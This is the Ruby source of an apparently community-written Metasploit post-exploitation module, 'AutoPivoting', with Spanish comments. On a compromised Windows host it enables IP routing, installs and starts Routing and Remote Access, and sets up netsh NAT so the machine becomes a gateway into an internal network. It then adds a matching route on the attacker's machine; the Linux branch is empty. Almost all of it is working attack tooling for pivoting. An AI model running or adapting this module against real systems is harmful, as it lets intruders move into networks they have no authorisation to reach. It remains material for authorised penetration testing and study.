##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'AutoPivoting',
        'Description'   => %q{This module Configures the computer to be a gateway torward other network. It works with linux and windows systems.},
        'License'       => MSF_LICENSE,
        'Author'        => 
           [
             'Mikel & j4r3',
             'none <none[at]gmail.com>'
           ],
		'Platform'      => [ 'win', 'linux'],
        'SessionTypes'  => [ 'meterpreter','shell']
      ))

    register_options(
      [
		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
		OptAddressRange.new('NET',    [true, 'The network we want to arrive (Example: 10.0.0.0/24)']),
		OptAddress.new('RHOST',    [true, 'IP address of pivot computer (our side IP)']),
		OptString.new('NInt01', [true, 'Name of pivot network adapter of our network. Explample: "eth0", "Ethernet 2"...']),
		OptString.new('NInt02', [true, 'Name of pivot network adapter of the other network. Explample: "eth1", "Ethernet", "tap0"...']),
      ])
  end
	# Obtenemos el OS de instalacion de metasploit
	def sistema_base?
		if (Msf::Config.local_directory[0,1])==("/")
			return "linux"
		elsif ((Msf::Config.local_directory[0,1])=~ /[[:alpha:]]/)
			return "windows"
		else
			#usamos uknown por el tipo de sistemas compatibles en el framwork
			return "unknown" 
		end
	end

	def linux_pivot()
		#
		# Linux commands
		#

	end
	
	def getStatus(status)
		#
		# Get Status in dtring format
		#
		
		case status.to_s
		when '1'
			return 'Stoped'
		when '4'
			return 'Started'
		when '7'
			return 'Disabled'
		end
		return "Unknown status: #{status.to_s}"
	end
	
	def windows_pivot()
		#
		# Windows commands
		#
		if is_admin? or is_system?
		
			rra_info = service_info("RemoteAccess")
			rra_status = getStatus(rra_info[:status])
			key = "HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\"
			iprouting_status = registry_getvalinfo(key,"IPEnableRouter")["Data"]
			print_status("Initial values:")
			print_status("	Service RemoteAccess status: #{rra_status}")
			print_status("	IPEnableRouter value: #{iprouting_status}")
			puts("")
			print_status("Starting the proccess...")			
			
			##################################
			# Bloque de versiones de windows #
			##################################
			
			win_version = session.sys.config.sysinfo
			
			# Primer bloque común a todas las versiones
			
			print_status("	Enabling IP Router...")
			
			if rra_status != 'Started'
				if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
					print_good("	IP Routing is Enabled.")
				else
					print_bad("  	There was an error set the IPEnableRouter value.")
					# Exit.
				end
			else
				print_good("	IP Routing is Enabled.")
			end
			
			# Primer bloque especifico para cada version
						
			if win_version['OS']=~ /Windows 2008/
				if have_powershell?
					print_status("Powershell is installed. Trying to install the services.")
					# En SSOO de 64 bits hay que ejecutar powershell de 64 bits para que funcione, si la shell/meterpreter es para 32 bits no funciona porque no existe el módulo ServerManager. Habría que comprobarlo en un W2008, W2012 y W2016 de 32 bits.
					# Windows 2008
					print_status(psh_exec("Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services"))
				else
					print_bad("Powershell is not installed. Trying to install from command line...")
					print_status(cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services"))
				end
			elsif win_version['OS']=~ /Windows 2012/
				if have_powershell?
					print_status("Powershell is installed. Trying to install the services.")
					print_status(psh_exec("Import-Module ServerManager; Add-WindowsFeature Routing"))
				else
					print_bad("Powershell is not installed. For this windows version (#{win_version['OS']}) we can't continue the execution.")
				end
			elsif win_version['OS']=~ /Windows 8/ or  win_version['OS']=~ /Windows 7/ or  win_version['OS']=~ /Windows 10/
				print_bad("The system is not compatible with this module.")
			end
			
			# Segundo bloque comun a todas las versiones
			print_status(cmd_exec("netsh routing ip nat install"))
			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
			
			# Segundo bloque especifico para cada version
			print_status("	Enabling Routing and Remote Access service...")
			if win_version['OS']=~ /Windows 2012/
				cmd_exec ("sc config RemoteAccess start= auto")
				print_status("	Starting Routing and Remote Access service...")
				cmd_exec("net start RemoteAccess")
			else # Resto de versiones hasta el momento, falta probar 2016
				if service_change_startup("RemoteAccess",2)
					print_good("	RemoteAccess service enabled.")
				else
					print_bad("  	There was an error enabling RemoteAccess service.")
					# Exit
				end
				print_status("	Starting Routing and Remote Access service...")
				if service_start("RemoteAccess")
					print_good("	RemoteAccess service started.")
				else
					print_bad("  	There was an error starting RemoteAccess service.")
					# Exit
				end
			end
			
			########Fin bloque############
	
			# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732263(v=ws.11)#BKMK_cmd
			
			puts("")
		else
			print_bad("You have to be administrator in the pivot machine to execute this module.")
		end
	end
	#
  	# acciones segun eleccion plataforma
  	#
	def set_pivot()
		case session.platform
	  	when 'linux'
		  	# codigo para linux
		  	linux_pivot()
		when 'windows'
		  	# codigo para windows
			windows_pivot()
		end
	end
	
	#conversion cidr a netmask
	def get_netmask(eval_net)
		cidr= eval_net.split("/").last
		return IPAddr.new('255.255.255.255').mask(cidr).to_s
	end
	#check de rnet si cumple formato ip/cidr debe de ser comprobado por OptAddressRange
	def check_rnet()
		if get_cidr(datastore['NET']) == false
			print_bad("cidr en blanco")
			return false
		elsif not((0..33).include?(get_cidr(datastore['NET'])))
			print_bad("cidr fuera de rango")
			return false
		elsif not(Rex::Socket.is_ipv4?(get_net(datastore['NET'])))
			print_bad("no es ipv4")
			return false
		else
			return true
		end
	end
	#funcion obtener red
	def get_net(eval_net)
		return eval_net.split("/").first
	end
	#funcion obtener cidr devuelve un integer con el cidr especificado y si no esta devuelve false
	def get_cidr(eval_net)
		if eval_net.include? "/"
			return eval_net.split("/").last.to_i
		else
			return false
		end
	end
	
	# Crea la ruta en la máquina local
	# Obtenemos sistema local:
	def create_route()
		print_status("Adding route to target network...")
		case sistema_base?
	  	when 'linux'
		  	if system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually.")
			end
		when 'windows'
		  	# codigo para windows conversion con variables de cidr a netmask y extraccion de red
			if system("route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually")
			end
		end
	end
	
	def get_interfaces ()
		#
		# Get a list of pivot interfaces, no es muy elegante. Hay que buscar otra forma.
		#
		interfaces_dict = {}
		case session.platform
		when 'windows'
			interfaces = cmd_exec('ipconfig').split("\n")
			counter = 0
			interfaces.each do |interface|
				if interface.include? "Ethernet"
					if interfaces[counter + 4].include? "IPv4"
						interfaces_dict[interface.gsub("\r","").gsub(" ","").gsub("adapter","").gsub("Adaptadorde","").gsub("Ethernet","").gsub(":","")] = interfaces[counter + 4].gsub(". ","").gsub("IPv4","").gsub("Address","").gsub("Dirección","").gsub(" ","").gsub(":","").gsub("\r","")
					end
				end
				counter = counter + 1
			end
		when 'linux'
			# comandos para linux
		end
		return interfaces_dict
	end
	#funcion calculo numero de interfaces validas(excluye las loopback)
	def num_ifaces()
		iface=client.net.config.interfaces
		count=0
		iface.each do |i|
			if not (i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
				count+=1
			end
		end
		return count
	end #def_ifaces
	
	#
	#obtiene los parametros de la interface del pivot, ip de la interface,netmask y nombre, si no es recuperable retorna nulo
	#
	def gw_interface()
		local_int=session.tunnel_local.split(":").first
		#puts("ip local: #{local_int}")
		remote_int=session.tunnel_peer.split(":").first
		#puts("ip remota: #{remote_int}")
		iface=client.net.config.interfaces
			iface.each do |i|
				if not (i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
					netmask=i.netmasks[0].to_s
					host= i.ip + "/" + netmask
					eval_net = IPAddr.new(host)
					#print_status("la net local a probar: #{host}")
					#print_status("la interface local a probar: #{local_int}")
					#print_status("la red local es: #{eval_net}")
					local_host= IPAddr.new(local_int)
					if eval_net.include?(local_host)
						netmask=i.netmasks[0].to_s
						return [remote_int,netmask,i.mac_name]
						#[0=>ip_interface,1=>netmask_interface,2=>nombre_interfaz]
					end
				    end
				end
			return nil
		end #end gw_interface
	
	#
	#obtiene los parametros de la r_net, ip de la interface remota,netmask, nombre y red, si no es recuperable retorna nulo
	#	
		def get_rnet()
		if num_ifaces() <= 1
			print_bad("no hay rnet que añadir")
		elsif num_ifaces() > 2
			print_bad("hay varias, añadir a mano la objetivo")
		elsif num_ifaces() == 2
			l_iface=gw_interface()[0]
			print_status("linterfaces es: #{l_iface}")
			r_iface=client.net.config.interfaces
			r_iface.each do |i|
				if not(i.mac_name =~ /Loopback/ or i.mac_name =~ /lo/)
					if i.ip != l_iface
						netmask=i.netmasks[0].to_s
						iface= i.ip + "/" + netmask
						eval_net = IPAddr.new(iface)
						#print_status("rinterface es: #{i.ip}")
						#print_status("r_net es: #{eval_net}")
						return [i.ip,netmask,i.mac_name,eval_net.to_s]
						#[0=>ip_interface,1=>netmask_interface,2=>nombre_interfaz,3=>red]
					end
				else
					return nil

				    end
			end

		else
			return nil
		end
	end #end get_rnet
	
	#
  	# funcion principal, donde se invocan los comandos necesarios segun la plataforma
  	#
	def run
		
		if check_rnet()
			
			# interfaces_pivot = get_interfaces()
			# puts(interfaces_pivot.to_s)
			# puts(session.ipconfig)
			# print_status("OS: #{session.sys.config.sysinfo['OS']}")
			# print_status("Computer name: #{'Computer'} ")
			# print_status("Current user: #{session.sys.config.getuid}")
			
			# print_status(psh_exec("Get-Module -ListAvailable"))
			set_pivot()
			create_route()
			# para saber si las rutas son correctas
			# print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
			# print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
		else
			print_bad("Aborting Module.")
		end
			
  	end
end
